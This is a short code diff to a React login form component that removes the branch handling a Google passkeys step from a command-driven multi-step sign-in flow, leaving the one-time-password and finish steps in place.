@@ -54,9 +54,6 @@ export default function LoginForm() {
         } else if (command === 'REQUEST_GOOGLE_AUTH_OTP') {
             setIsLoading(false);
             setCurrentStep('auth_otp');
-        } else if (command === 'REQUEST_GOOGLE_PASSKEYS') {
-            setIsLoading(false);
-            setCurrentStep('passkeys');
         } else if (command === 'CORRECT_OTP') {
             setIsLoading(false);
         } else if (command === 'FINISH') {
